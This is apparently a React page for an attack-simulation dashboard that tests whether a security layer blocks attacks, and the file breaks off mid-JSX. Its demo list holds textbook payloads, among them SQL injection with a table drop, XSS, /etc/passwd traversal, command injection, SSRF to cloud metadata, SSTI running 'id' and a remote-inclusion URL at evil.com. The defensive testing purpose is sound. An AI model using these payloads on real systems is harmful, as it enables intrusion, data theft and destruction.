import { useState, useEffect, useRef, useCallback } from 'react';
import { Link } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { useTranslation } from 'react-i18next';
import {
    Shield,
    Play,
    RefreshCw,
    CheckCircle,
    XCircle,
    Clock,
    BarChart3,
    Zap,
    Terminal,
    Bot,
    Users,
    Activity,
    Database,
    Code,
    FolderOpen,
    TerminalSquare,
    Gauge,
    ChevronDown,
    ChevronRight,
    AlertTriangle,
    Server,
    Cloud,
    Key,
    Wifi,
    AlertCircle,
    Upload,
    Cpu,
} from 'lucide-react';
import { fetchAttackTypes, getAttackRunRouteId, runAttackSimulation, fetchAttackHistory } from '../services/api';
import type { AttackType, AttackResult, AttackSimulationReport } from '../types/api';
import { useDemo } from '../context/DemoContext';
import { useWebSocket } from '../context/WebSocketContext';
import { ConsoleEmptyState, ConsolePanel, ConsoleStatCard } from '../components/ConsolePrimitives';

const ATTACK_CATEGORIES_CONFIG = [
    { id: 'sql_injection', icon: Database, color: 'text-rose-600 dark:text-rose-400', bgColor: 'bg-rose-500/10', borderColor: 'border-rose-500/20' },
    { id: 'xss', icon: Code, color: 'text-orange-600 dark:text-orange-400', bgColor: 'bg-orange-500/10', borderColor: 'border-orange-500/20' },
    { id: 'path_traversal', icon: FolderOpen, color: 'text-amber-600 dark:text-amber-400', bgColor: 'bg-amber-500/10', borderColor: 'border-amber-500/20' },
    { id: 'command_injection', icon: TerminalSquare, color: 'text-violet-600 dark:text-violet-400', bgColor: 'bg-violet-500/10', borderColor: 'border-violet-500/20' },
    { id: 'rate_abuse', icon: Gauge, color: 'text-blue-600 dark:text-blue-400', bgColor: 'bg-blue-500/10', borderColor: 'border-blue-500/20' },
    { id: 'csrf', icon: Shield, color: 'text-pink-600 dark:text-pink-400', bgColor: 'bg-pink-500/10', borderColor: 'border-pink-500/20' },
    { id: 'ssrf', icon: Activity, color: 'text-cyan-600 dark:text-cyan-400', bgColor: 'bg-cyan-500/10', borderColor: 'border-cyan-500/20' },
    { id: 'xxe', icon: FolderOpen, color: 'text-lime-600 dark:text-lime-400', bgColor: 'bg-lime-500/10', borderColor: 'border-lime-500/20' },
    { id: 'dos', icon: Zap, color: 'text-rose-600 dark:text-rose-400', bgColor: 'bg-rose-500/10', borderColor: 'border-rose-500/20' },
    { id: 'ldap_injection', icon: Users, color: 'text-indigo-600 dark:text-indigo-400', bgColor: 'bg-indigo-500/10', borderColor: 'border-indigo-500/20' },
    { id: 'nosql_injection', icon: Database, color: 'text-violet-600 dark:text-violet-400', bgColor: 'bg-violet-500/10', borderColor: 'border-violet-500/20' },
    { id: 'http_smuggling', icon: Terminal, color: 'text-fuchsia-600 dark:text-fuchsia-400', bgColor: 'bg-fuchsia-500/10', borderColor: 'border-fuchsia-500/20' },
    { id: 'ssti', icon: Code, color: 'text-teal-600 dark:text-teal-400', bgColor: 'bg-teal-500/10', borderColor: 'border-teal-500/20' },
    { id: 'deserialization', icon: TerminalSquare, color: 'text-amber-600 dark:text-amber-400', bgColor: 'bg-amber-500/10', borderColor: 'border-amber-500/20' },
    { id: 'privilege_escalation', icon: Shield, color: 'text-emerald-600 dark:text-emerald-400', bgColor: 'bg-emerald-500/10', borderColor: 'border-emerald-500/20' },
    { id: 'man_in_the_middle', icon: Activity, color: 'text-sky-600 dark:text-sky-400', bgColor: 'bg-sky-500/10', borderColor: 'border-sky-500/20' },
    { id: 'dns_hijacking', icon: Zap, color: 'text-stone-600 dark:text-stone-400', bgColor: 'bg-stone-500/10', borderColor: 'border-stone-500/20' },
    { id: 'cache_poisoning', icon: Database, color: 'text-neutral-600 dark:text-neutral-400', bgColor: 'bg-neutral-500/10', borderColor: 'border-neutral-500/20' },
    { id: 'clickjacking', icon: FolderOpen, color: 'text-zinc-600 dark:text-zinc-400', bgColor: 'bg-zinc-500/10', borderColor: 'border-zinc-500/20' },
    { id: 'replay_attack', icon: Clock, color: 'text-rose-600 dark:text-rose-400', bgColor: 'bg-rose-500/10', borderColor: 'border-rose-500/20' },
    { id: 'session_fixation', icon: Shield, color: 'text-orange-600 dark:text-orange-400', bgColor: 'bg-orange-500/10', borderColor: 'border-orange-500/20' },
    { id: 'user_enumeration', icon: Users, color: 'text-amber-600 dark:text-amber-400', bgColor: 'bg-amber-500/10', borderColor: 'border-amber-500/20' },
    { id: 'cors_misconfig', icon: Terminal, color: 'text-emerald-600 dark:text-emerald-400', bgColor: 'bg-emerald-500/10', borderColor: 'border-emerald-500/20' },
    { id: 'host_header_injection', icon: Code, color: 'text-blue-600 dark:text-blue-400', bgColor: 'bg-blue-500/10', borderColor: 'border-blue-500/20' },
    { id: 'auth_bypass', icon: TerminalSquare, color: 'text-violet-600 dark:text-violet-400', bgColor: 'bg-violet-500/10', borderColor: 'border-violet-500/20' },
    { id: 'file_upload', icon: Upload, color: 'text-pink-600 dark:text-pink-400', bgColor: 'bg-pink-500/10', borderColor: 'border-pink-500/20' },
    { id: 'file_inclusion', icon: FolderOpen, color: 'text-cyan-600 dark:text-cyan-400', bgColor: 'bg-cyan-500/10', borderColor: 'border-cyan-500/20' },
    { id: 'jwt_attacks', icon: Key, color: 'text-lime-600 dark:text-lime-400', bgColor: 'bg-lime-500/10', borderColor: 'border-lime-500/20' },
    { id: 'password_reset_abuse', icon: Shield, color: 'text-rose-600 dark:text-rose-400', bgColor: 'bg-rose-500/10', borderColor: 'border-rose-500/20' },
    { id: 'graphql_injection', icon: Code, color: 'text-indigo-600 dark:text-indigo-400', bgColor: 'bg-indigo-500/10', borderColor: 'border-indigo-500/20' },
    { id: 'websocket_attacks', icon: Wifi, color: 'text-violet-600 dark:text-violet-400', bgColor: 'bg-violet-500/10', borderColor: 'border-violet-500/20' },
    { id: 'api_security', icon: AlertCircle, color: 'text-fuchsia-600 dark:text-fuchsia-400', bgColor: 'bg-fuchsia-500/10', borderColor: 'border-fuchsia-500/20' },
    { id: 'container_escape', icon: Cpu, color: 'text-teal-600 dark:text-teal-400', bgColor: 'bg-teal-500/10', borderColor: 'border-teal-500/20' },
    { id: 'kubernetes_attack', icon: Server, color: 'text-amber-600 dark:text-amber-400', bgColor: 'bg-amber-500/10', borderColor: 'border-amber-500/20' },
    { id: 'cloud_infrastructure', icon: Cloud, color: 'text-emerald-600 dark:text-emerald-400', bgColor: 'bg-emerald-500/10', borderColor: 'border-emerald-500/20' }
];

const SEVERITY_STYLES = {
    critical: { bg: 'bg-rose-500/10', text: 'text-rose-600 dark:text-rose-400', border: 'border-rose-500/25' },
    high: { bg: 'bg-orange-500/10', text: 'text-orange-600 dark:text-orange-400', border: 'border-orange-500/25' },
    medium: { bg: 'bg-amber-500/10', text: 'text-amber-600 dark:text-amber-400', border: 'border-amber-500/25' },
    low: { bg: 'bg-blue-500/10', text: 'text-blue-600 dark:text-blue-400', border: 'border-blue-500/25' }
};

const AGENT_STYLES = {
    socrates: { color: 'text-rose-600 dark:text-rose-400', bg: 'bg-rose-500/10', border: 'border-rose-500/20', name: 'Socrates' },
    plato: { color: 'text-blue-600 dark:text-blue-400', bg: 'bg-blue-500/10', border: 'border-blue-500/20', name: 'Plato' },
    aristotle: { color: 'text-violet-600 dark:text-violet-400', bg: 'bg-violet-500/10', border: 'border-violet-500/20', name: 'Aristotle' },
    orchestrator: { color: 'text-emerald-600 dark:text-emerald-400', bg: 'bg-emerald-500/10', border: 'border-emerald-500/20', name: 'Orchestrator' },
    system: { color: 'text-muted-foreground', bg: 'bg-muted/40', border: 'border-border', name: 'System' }
};

interface AgentAnalysis {
    attackId: string;
    agent: string;
    status: string;
    message: string;
    verdict?: string;
    confidence?: number;
    reasoning?: string;
    evidence?: any[];
}

interface AttackProgress {
    attackId: string;
    attackName: string;
    category: string;
    severity: string;
    payload: string;
    status: 'pending' | 'analyzing' | 'complete';
    result?: AttackResult;
    analyses: AgentAnalysis[];
}

const containerVariants = {
    hidden: { opacity: 0 },
    visible: {
        opacity: 1,
        transition: { staggerChildren: 0.1 }
    }
};

const itemVariants = {
    hidden: { opacity: 0, y: 20 },
    visible: { opacity: 1, y: 0 }
};

export default function AttackSimulator() {
    const { t } = useTranslation();
    const { isDemoMode } = useDemo();
    const { connected: wsConnected, subscribe } = useWebSocket();
    
    const [attackTypes, setAttackTypes] = useState<AttackType[]>([]);
    const [selectedAttacks, setSelectedAttacks] = useState<string[]>([]);
    const [isRunning, setIsRunning] = useState(false);
    const [report, setReport] = useState<AttackSimulationReport | null>(null);
    const [history, setHistory] = useState<AttackSimulationReport[]>([]);
    const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
    const [attackProgress, setAttackProgress] = useState<AttackProgress[]>([]);
    const [expandedCategories, setExpandedCategories] = useState<string[]>(ATTACK_CATEGORIES_CONFIG.map(c => c.id));

    const terminalRef = useRef<HTMLDivElement>(null);

    const ATTACK_CATEGORIES = ATTACK_CATEGORIES_CONFIG.map(cat => ({
        ...cat,
        name: t(`attackSimulator.categories.${cat.id}`)
    }));

    const addLocalTerminalLog = useCallback((message: string) => {
        const timestamp = new Date().toLocaleTimeString();
        setTerminalLogs(prev => [...prev, `[${timestamp}] ${message}`]);
    }, []);

    useEffect(() => {
        loadAttackTypes();
        loadHistory();
    }, []);

    useEffect(() => {
        const unsubscribe = subscribe('*', (data: any) => {
            const { event, ...eventData } = data;

            switch (event) {
                case 'attack:simulation:start':
                    addLocalTerminalLog(`开始演练：${eventData.totalAttacks} 项攻击`);
                    setAttackProgress(eventData.attacks.map((a: any) => ({
                        attackId: a.id,
                        attackName: a.name,
                        category: a.category,
                        severity: a.severity,
                        payload: a.payload,
                        status: 'pending' as const,
                        analyses: []
                    })));
                    setIsRunning(true);
                    break;

                case 'attack:start':
                    addLocalTerminalLog(`开始执行攻击：${eventData.attackName}`);
                    setAttackProgress(prev => prev.map((p, i) => 
                        i === eventData.attackIndex 
                            ? { ...p, status: 'analyzing' }
                            : p
                    ));
                    break;

                case 'agent:analysis':
                    addLocalTerminalLog(`[${eventData.agent.toUpperCase()}] ${eventData.message}`);
                    setAttackProgress(prev => prev.map(p => 
                        p.attackId === eventData.attackId
                            ? { ...p, analyses: [...p.analyses, eventData] }
                            : p
                    ));
                    break;

                case 'attack:result':
                    addLocalTerminalLog(`结果：${eventData.attackName} - ${eventData.blocked ? t('attackSimulator.blocked') : t('attackSimulator.allowed')}`);
                    setAttackProgress(prev => prev.map((p, i) => 
                        i === eventData.attackIndex
                            ? { ...p, status: 'complete', result: eventData }
                            : p
                    ));
                    break;

                case 'attack:simulation:complete':
                    addLocalTerminalLog(t('attackSimulator.completed'));
                    setReport(eventData);
                    setIsRunning(false);
                    break;
            }
        });

        return () => {
            unsubscribe();
        };
    }, [subscribe, addLocalTerminalLog, t]);

    useEffect(() => {
        if (terminalRef.current) {
            terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
        }
    }, [terminalLogs]);

    const loadAttackTypes = async () => {
        const types = await fetchAttackTypes();
        if (types.length > 0) {
            setAttackTypes(types);
        } else if (isDemoMode) {
            setAttackTypes(getDefaultAttackTypes());
        } else {
            setAttackTypes([]);
        }
    };

    const loadHistory = async () => {
        const data = await fetchAttackHistory();
        setHistory(data);
    };

    const getDefaultAttackTypes = (): AttackType[] => {
        return [
            // SQL Injection Attacks
            { id: 'sql-1', name: "Basic OR Bypass", category: 'sql_injection', severity: 'critical', description: "' OR '1'='1' --" },
            { id: 'sql-2', name: "UNION SELECT", category: 'sql_injection', severity: 'critical', description: "UNION SELECT * FROM users" },
            { id: 'sql-3', name: "Comment Injection", category: 'sql_injection', severity: 'high', description: "admin'--" },
            { id: 'sql-4', name: "Time-Based Blind", category: 'sql_injection', severity: 'high', description: "'; WAITFOR DELAY '0:0:5'--" },
            { id: 'sql-5', name: "Error-Based", category: 'sql_injection', severity: 'high', description: "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--" },
            { id: 'sql-6', name: "Stacked Queries", category: 'sql_injection', severity: 'critical', description: "'; DROP TABLE users--" },
            { id: 'sql-7', name: "Second Order", category: 'sql_injection', severity: 'critical', description: "Stored in database, executed later" },
            { id: 'sql-8', name: "NoSQL Injection (Mongo)", category: 'nosql_injection', severity: 'high', description: "username[$ne]=admin" },

            // XSS Attacks
            { id: 'xss-1', name: "Script Tag", category: 'xss', severity: 'high', description: "<script>alert('XSS')</script>" },
            { id: 'xss-2', name: "Event Handler", category: 'xss', severity: 'high', description: "<img src=x onerror=alert(1)>" },
            { id: 'xss-3', name: "Stored XSS", category: 'xss', severity: 'critical', description: "Persists in database, affects all users" },
            { id: 'xss-4', name: "DOM XSS", category: 'xss', severity: 'high', description: "location.hash.slice(1)" },
            { id: 'xss-5', name: "Self XSS", category: 'xss', severity: 'low', description: "User attacks themselves with malicious script" },
            { id: 'xss-6', name: "Reflected XSS", category: 'xss', severity: 'high', description: "Immediate reflection in HTTP response" },
            { id: 'xss-7', name: "Polyglot XSS", category: 'xss', severity: 'high', description: "Works across multiple contexts" },
            { id: 'xss-8', name: "XSS via POST", category: 'xss', severity: 'medium', description: "Stored through POST parameter" },

            // Path Traversal Attacks
            { id: 'path-1', name: "Basic Traversal", category: 'path_traversal', severity: 'critical', description: "../../../etc/passwd" },
            { id: 'path-2', name: "Null Byte Injection", category: 'path_traversal', severity: 'high', description: "../../../etc/passwd%00.jpg" },
            { id: 'path-3', name: "URL Encoded", category: 'path_traversal', severity: 'high', description: "%2e%2e%2fetc%2fpasswd" },
            { id: 'path-4', name: "Windows Path", category: 'path_traversal', severity: 'critical', description: "..\\..\\..\\windows\\system32\\" },
            { id: 'path-5', name: "Local File Inclusion", category: 'file_inclusion', severity: 'critical', description: "include.php?file=../../etc/passwd" },
            { id: 'path-6', name: "Remote File Inclusion", category: 'file_inclusion', severity: 'critical', description: "include.php?file=http://evil.com/shell.php" },

            // Command Injection Attacks
            { id: 'cmd-1', name: "Semicolon Injection", category: 'command_injection', severity: 'critical', description: "127.0.0.1; cat /etc/passwd" },
            { id: 'cmd-2', name: "Pipe Injection", category: 'command_injection', severity: 'critical', description: "127.0.0.1 | whoami" },
            { id: 'cmd-3', name: "Backtick Injection", category: 'command_injection', severity: 'critical', description: "127.0.0.1 `ls -la`" },
            { id: 'cmd-4', name: "Newline Injection", category: 'command_injection', severity: 'high', description: "127.0.0.1\\ncat /etc/passwd" },
            { id: 'cmd-5', name: "Argument Injection", category: 'command_injection', severity: 'high', description: "upload.php -filename evil.txt" },
            { id: 'cmd-6', name: "Subshell Injection", category: 'command_injection', severity: 'critical', description: "$(cat /etc/passwd)" },

            // Rate Limit / DoS Attacks
            { id: 'rate-1', name: "Rapid Requests", category: 'rate_abuse', severity: 'medium', description: "100 requests in 1 second" },
            { id: 'rate-2', name: "HTTP Flood", category: 'dos', severity: 'critical', description: "Distributed HTTP request flood" },
            { id: 'rate-3', name: "SYN Flood", category: 'dos', severity: 'critical', description: "TCP SYN packet flood" },
            { id: 'rate-4', name: "UDP Flood", category: 'dos', severity: 'high', description: "UDP packet amplification attack" },
            { id: 'rate-5', name: "Slowloris", category: 'dos', severity: 'high', description: "Slow HTTP connection exhaustion" },
            { id: 'rate-6', name: "Ping Flood", category: 'dos', severity: 'medium', description: "ICMP echo request flood" },
            { id: 'rate-7', name: "Smurf Attack", category: 'dos', severity: 'high', description: "ICMP broadcast amplification" },
            { id: 'rate-8', name: "Amplification DNS", category: 'dos', severity: 'high', description: "DNS amplification attack" },

            // CSRF Attacks
            { id: 'csrf-1', name: "Basic CSRF", category: 'csrf', severity: 'high', description: "Cross-site request forgery" },
            { id: 'csrf-2', name: "Stored CSRF", category: 'csrf', severity: 'high', description: "Stored CSRF payload" },
            { id: 'csrf-3', name: "Login CSRF", category: 'csrf', severity: 'high', description: "CSRF during login flow" },
            { id: 'csrf-4', name: "CSRF Token Bypass", category: 'csrf', severity: 'critical', description: "Missing or weak CSRF token" },

            // SSRF Attacks
            { id: 'ssrf-1', name: "Internal Port Scan", category: 'ssrf', severity: 'critical', description: "http://127.0.0.1:22" },
            { id: 'ssrf-2', name: "Cloud Metadata", category: 'ssrf', severity: 'critical', description: "http://169.254.169.254/latest/meta-data/" },
            { id: 'ssrf-3', name: "File Protocol", category: 'ssrf', severity: 'high', description: "file:///etc/passwd" },
            { id: 'ssrf-4', name: "DNS Rebinding", category: 'ssrf', severity: 'high', description: "DNS-based SSRF bypass" },
            { id: 'ssrf-5', name: "Gopher Protocol", category: 'ssrf', severity: 'high', description: "gopher://127.0.0.1:6379/_*1%0d%0a" },

            // XXE Attacks
            { id: 'xxe-1', name: "File Disclosure", category: 'xxe', severity: 'critical', description: "XXE to read /etc/passwd" },
            { id: 'xxe-2', name: "SSRF via XXE", category: 'xxe', severity: 'critical', description: "XXE for server-side request forgery" },
            { id: 'xxe-3', name: "Blind XXE", category: 'xxe', severity: 'high', description: "XXE with OOB data exfiltration" },
            { id: 'xxe-4', name: "XXE DoS", category: 'xxe', severity: 'high', description: "Billion laughs attack" },

            // LDAP Injection
            { id: 'ldap-1', name: "Basic LDAP Injection", category: 'ldap_injection', severity: 'high', description: "(&(uid=*)(password=*))" },
            { id: 'ldap-2', name: "LDAP AND Injection", category: 'ldap_injection', severity: 'high', description: "(&(uid=admin)(password=*))" },
            { id: 'ldap-3', name: "LDAP OR Injection", category: 'ldap_injection', severity: 'critical', description: "(|(uid=admin)(uid=test))" },
            { id: 'ldap-4', name: "LDAP Blind Injection", category: 'ldap_injection', severity: 'high', description: "Timing-based LDAP injection" },

            // HTTP Smuggling
            { id: 'http-1', name: "CL.TE Smuggling", category: 'http_smuggling', severity: 'high', description: "Content-Length + Transfer-Encoding clash" },
            { id: 'http-2', name: "TE.CL Smuggling", category: 'http_smuggling', severity: 'high', description: "Transfer-Encoding + Content-Length clash" },
            { id: 'http-3', name: "Request Splitting", category: 'http_smuggling', severity: 'critical', description: "CRLF injection to split requests" },
            { id: 'http-4', name: "Cache Poisoning", category: 'http_smuggling', severity: 'critical', description: "HTTP smuggling cache poisoning" },

            // SSTI Attacks
            { id: 'ssti-1', name: "Jinja2 SSTI", category: 'ssti', severity: 'critical', description: "{{config.items()}}" },
            { id: 'ssti-2', name: "ERB SSTI", category: 'ssti', severity: 'critical', description: "<%= system('id') %>" },
            { id: 'ssti-3', name: "Twig SSTI", category: 'ssti', severity: 'critical', description: "{{_self.env.display(\"id\")}}" },
            { id: 'ssti-4', name: "FreeMarker SSTI", category: 'ssti', severity: 'high', description: "<#assign ex=\"freemarker.template.utility.Execute\">" },

            // Deserialization Attacks
            { id: 'deser-1', name: "Java Deserialization", category: 'deserialization', severity: 'critical', description: "ysoserial CommonsCollections1" },
            { id: 'deser-2', name: "PHP Object Injection", category: 'deserialization', severity: 'critical', description: "Unserialize gadget chain" },
            { id: 'deser-3', name: "Python Pickle", category: 'deserialization', severity: 'critical', description: "Malicious pickle payload" },
            { id: 'deser-4', name: "Node.js Deserialization", category: 'deserialization', severity: 'high', description: "node-serialize exploit" },

            // Privilege Escalation
            { id: 'priv-1', name: "IDOR", category: 'privilege_escalation', severity: 'high', description: "Insecure direct object reference" },
            { id: 'priv-2', name: "Broken Access Control", category: 'privilege_escalation', severity: 'high', description: "Bypass admin endpoint access" },
            { id: 'priv-3', name: "Privilege Boundary", category: 'privilege_escalation', severity: 'critical', description: "Cross-privilege access" },
            { id: 'priv-4', name: "Role-Based Bypass", category: 'privilege_escalation', severity: 'high', description: "RBAC misconfiguration" },

            // Man in the Middle
            { id: 'mitm-1', name: "SSL Strip", category: 'man_in_the_middle', severity: 'high', description: "Downgrade HTTPS to HTTP" },
            { id: 'mitm-2', name: "ARP Poisoning", category: 'man_in_the_middle', severity: 'high', description: "ARP cache poisoning" },
            { id: 'mitm-3', name: "DNS Spoofing", category: 'dns_hijacking', severity: 'high', description: "Fake DNS responses" },
            { id: 'mitm-4', name: "BGP Hijacking", category: 'man_in_the_middle', severity: 'critical', description: "BGP route hijacking" },

            // Cache Poisoning
            { id: 'cache-1', name: "Web Cache Poisoning", category: 'cache_poisoning', severity: 'high', description: "Cache key manipulation" },
            { id: 'cache-2', name: "Cache Deception", category: 'cache_poisoning', severity: 'high', description: "Cache header manipulation" },
            { id: 'cache-3', name: "DNS Cache Poisoning", category: 'dns_hijacking', severity: 'high', description: "Cache pollution attack" },

            // Clickjacking
            { id: 'click-1', name: "Basic Clickjacking", category: 'clickjacking', severity: 'medium', description: "UI redress attack via iframe" },
            { id: 'click-2', name: "Likejacking", category: 'clickjacking', severity: 'low', description: "Clickjacking social networks" },

            // Replay Attack
            { id: 'replay-1', name: "Token Replay", category: 'replay_attack', severity: 'high', description: "Replay captured JWT" },
            { id: 'replay-2', name: "OTP Replay", category: 'replay_attack', severity: 'medium', description: "Reuse one-time password" },

            // Session Fixation
            { id: 'sess-1', name: "Session Fixation", category: 'session_fixation', severity: 'high', description: "Enforce fixed session ID" },
            { id: 'sess-2', name: "Session Hijacking", category: 'session_fixation', severity: 'high', description: "Steal and use session cookie" },

            // User Enumeration
            { id: 'enum-1', name: "User Enumeration", category: 'user_enumeration', severity: 'medium', description: "Guess existing usernames" },
            { id: 'enum-2', name: "Email Enumeration", category: 'user_enumeration', severity: 'medium', description: "Password reset email timing" },

            // CORS Misconfiguration
            { id: 'cors-1', name: "CORS Wildcard", category: 'cors_misconfig', severity: 'medium', description: "Access-Control-Allow-Origin: *" },
            { id: 'cors-2', name: "CORS Bypass", category: 'cors_misconfig', severity: 'high', description: "Reflect origin without validation" },

            // Host Header Injection
            { id: 'host-1', name: "Host Header Injection", category: 'host_header_injection', severity: 'medium', description: "Poison Host header value" },
            { id: 'host-2', name: "Cache Poisoning via Host", category: 'host_header_injection', severity: 'high', description: "Host-based cache poisoning" },

            // Auth Bypass
            { id: 'auth-1', name: "JWT None Algorithm", category: 'jwt_attacks', severity: 'critical', description: "alg: none bypass" },
            { id: 'auth-2', name: "Weak JWT Secret", category: 'jwt_attacks', severity: 'high', description: "Brute force JWT secret" },
            { id: 'auth-3', name: "JWT Key Confusion", category: 'jwt_attacks', severity: 'high', description: "RSA/HMAC confusion attack" },
            { id: 'auth-4', name: "Hardcoded Credentials", category: 'auth_bypass', severity: 'critical', description: "Default admin credentials" },
            { id: 'auth-5', name: "Authentication Bypass", category: 'auth_bypass', severity: 'critical', description: "Skip auth check entirely" },

            // File Upload Attacks
            { id: 'upload-1', name: "Shell Upload", category: 'file_upload', severity: 'critical', description: "Upload malicious PHP shell" },
            { id: 'upload-2', name: "MIME Type Bypass", category: 'file_upload', severity: 'high', description: "Upload PHP as .jpg" },
            { id: 'upload-3', name: "ImageTragick", category: 'file_upload', severity: 'high', description: "Polyglot JPG/PHP" },

            // GraphQL Injection
            { id: 'graphql-1', name: "GraphQL Injection", category: 'graphql_injection', severity: 'high', description: "Inject into GraphQL query" },
            { id: 'graphql-2', name: "GraphQL DoS", category: 'graphql_injection', severity: 'medium', description: "Nested query DoS" },
            { id: 'graphql-3', name: "GraphQL Introspection", category: 'graphql_injection', severity: 'low', description: "Dump GraphQL schema" },

            // WebSocket Attacks
            { id: 'ws-1', name: "WebSocket XSS", category: 'websocket_attacks', severity: 'high', description: "XSS via WebSocket message" },
            { id: 'ws-2', name: "WebSocket DoS", category: 'websocket_attacks', severity: 'medium', description: "WebSocket message flood" },

            // API Security
            { id: 'api-1', name: "Mass Assignment", category: 'api_security', severity: 'medium', description: "Overwrite object fields" },
            { id: 'api-2', name: "IDOR", category: 'api_security', severity: 'high', description: "Access other users' data" },
            { id: 'api-3', name: "API Key Leakage", category: 'api_security', severity: 'high', description: "Expose API keys in logs" },

            // Container/Cloud Attacks
            { id: 'cont-1', name: "Container Escape", category: 'container_escape', severity: 'critical', description: "Break out of Docker container" },
            { id: 'cont-2', name: "K8s RBAC Bypass", category: 'kubernetes_attack', severity: 'critical', description: "Escalate K8s privileges" },
            { id: 'cont-3', name: "IAM Privilege Escalation", category: 'cloud_infrastructure', severity: 'critical', description: "Escalate cloud IAM roles" },
            { id: 'cont-4', name: "SSRF in Cloud", category: 'cloud_infrastructure', severity: 'critical', description: "Access cloud metadata service" },
            { id: 'cont-5', name: "Secret Exposure", category: 'cloud_infrastructure', severity: 'high', description: "Leak cloud credentials" }
        ];
    };

    const toggleAttack = (id: string) => {
        setSelectedAttacks(prev => 
            prev.includes(id) 
                ? prev.filter(a => a !== id)
                : [...prev, id]
        );
    };

    const toggleCategory = (id: string) => {
        setExpandedCategories(prev => 
            prev.includes(id) 
                ? prev.filter(c => c !== id)
                : [...prev, id]
        );
    };

    const selectAll = () => {
        if (selectedAttacks.length === attackTypes.length) {
            setSelectedAttacks([]);
        } else {
            setSelectedAttacks(attackTypes.map(a => a.id));
        }
    };

    const runSimulation = async () => {
        setIsRunning(true);
        setTerminalLogs([]);
        setReport(null);
        setAttackProgress([]);

        addLocalTerminalLog(`${t('attackSimulator.runSimulation')}...`);
        addLocalTerminalLog(`${t('attackSimulator.selected')} ${selectedAttacks.length} ${t('attackSimulator.attacks')}`);

        const result = await runAttackSimulation(
            selectedAttacks.length > 0 ? selectedAttacks : undefined
        );

        if (result) {
            setReport(result);
            addLocalTerminalLog(`${t('attackSimulator.completed')}!`);
            addLocalTerminalLog(`   ${t('attackSimulator.total')}: ${result.total}`);
            addLocalTerminalLog(`   ${t('attackSimulator.blocked')}: ${result.blocked}`);
            addLocalTerminalLog(`   ${t('attackSimulator.allowed')}: ${result.allowed}`);
        } else {
            addLocalTerminalLog('演练失败，未返回结果数据');
        }

        setIsRunning(false);
    };

    const getBlockRate = () => {
        if (!report || report.total === 0) return 0;
        return ((report.blocked / report.total) * 100).toFixed(1);
    };

    const getSeverityStyle = (severity: string) => {
        return SEVERITY_STYLES[severity as keyof typeof SEVERITY_STYLES] || SEVERITY_STYLES.medium;
    };

    const getAgentStyle = (agent: string) => {
        return AGENT_STYLES[agent as keyof typeof AGENT_STYLES] || AGENT_STYLES.system;
    };

    const getCategoryName = (categoryId: string) => {
        return t(`attackSimulator.categories.${categoryId}`);
    };

    const getSeverityName = (severity: string) => {
        return t(`attackSimulator.severities.${severity}`);
    };

    return (
        <motion.div initial="hidden" animate="visible" variants={containerVariants} className="mx-auto min-h-screen max-w-[1600px] space-y-6 p-6 pb-12">
            <motion.div variants={itemVariants} className="flex flex-col gap-4 lg:flex-row lg:items-center lg:justify-between">
                <div className="flex items-start gap-4">
                    <div className="flex h-12 w-12 items-center justify-center rounded-2xl border border-rose-500/20 bg-rose-500/10">
                        <Shield className="h-6 w-6 text-rose-600 dark:text-rose-400" />
                    </div>
                    <div className="space-y-1">
                        <h1 className="text-2xl font-bold tracking-tight text-foreground">{t('attackSimulator.title')}</h1>
                        <p className="text-sm text-muted-foreground">{t('attackSimulator.subtitle')}</p>
                    </div>
                </div>
                <div className="flex flex-wrap items-center gap-3">
                    <div
                        className={`flex items-center gap-2 rounded-lg border px-4 py-2 text-sm font-medium ${
                            wsConnected
                                ? 'border-emerald-500/20 bg-emerald-500/10 text-emerald-600 dark:text-emerald-400'
                                : 'border-rose-500/20 bg-rose-500/10 text-rose-600 dark:text-rose-400'
                        }`}
                    >
                        <Activity className="h-4 w-4" />
                        {wsConnected ? t('attackSimulator.liveConnected') : t('attackSimulator.disconnected')}
                    </div>
                    <button
                        onClick={selectAll}
                        className="rounded-lg border border-border bg-card px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-muted/30"
                    >
                        {selectedAttacks.length === attackTypes.length ? t('attackSimulator.deselectAll') : t('attackSimulator.selectAll')}
                    </button>
                    <button
                        onClick={runSimulation}
                        disabled={isRunning}
                        className="flex items-center gap-2 rounded-lg bg-primary px-5 py-2.5 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90 disabled:cursor-not-allowed disabled:opacity-60"
                    >
                        {isRunning ? <RefreshCw className="h-4 w-4 animate-spin" /> : <Play className="h-4 w-4" />}
                        {isRunning ? t('attackSimulator.running') : t('attackSimulator.runSimulation')}
                    </button>
                </div>
            </motion.div>

            <div className="grid grid-cols-1 gap-4 md:grid-cols-2 xl:grid-cols-4">
                <ConsoleStatCard
                    icon={Zap}
                    label={t('attackSimulator.attackTypes')}
                    value={attackTypes.length}
                    hint={`${selectedAttacks.length} ${t('attackSimulator.selected')}`}
                    tone="warning"
                />
                <ConsoleStatCard
                    icon={Users}
                    label={t('attackSimulator.liveAttackAnalysis')}
                    value={attackProgress.length}
                    hint={`${attackProgress.filter((item) => item.status === 'complete').length} ${t('attackSimulator.completed')}`}
                    tone="primary"
                />
                <ConsoleStatCard
                    icon={Terminal}
                    label={t('attackSimulator.terminal')}
                    value={terminalLogs.length}
                    hint={terminalLogs.length > 0 ? terminalLogs[terminalLogs.length - 1] : t('attackSimulator.waitingSimulation')}
                    tone="neutral"
                />
                <ConsoleStatCard
                    icon={BarChart3}
                    label={t('attackSimulator.blockRate')}
                    value={report ? `${getBlockRate()}%` : '--'}
                    hint={report ? `${report.blocked}/${report.total}` : t('attackSimulator.selectAndRun')}
                    tone="success"
                />
            </div>

            <div className="grid grid-cols-1 gap-6 lg:grid-cols-12">
                <motion.div variants={itemVariants} className="lg:col-span-4 xl:col-span-3">
                    <ConsolePanel
                        title={t('attackSimulator.attackTypes')}
                        subtitle={`${selectedAttacks.length} ${t('attackSimulator.selected')}`}
                        icon={Zap}
                        iconTone="warning"
                    >
                        <div className="max-h-[calc(100vh-340px)] space-y-3 overflow-y-auto pr-1">
                            {ATTACK_CATEGORIES.map((category) => {
                                const categoryAttacks = attackTypes.filter((attack) => attack.category === category.id);
                                const isExpanded = expandedCategories.includes(category.id);
                                const selectedInCategory = categoryAttacks.filter((attack) => selectedAttacks.includes(attack.id)).length;
                                const Icon = category.icon;

                                return (
                                    <div key={category.id} className={`overflow-hidden rounded-xl border ${category.borderColor}`}>
                                        <button
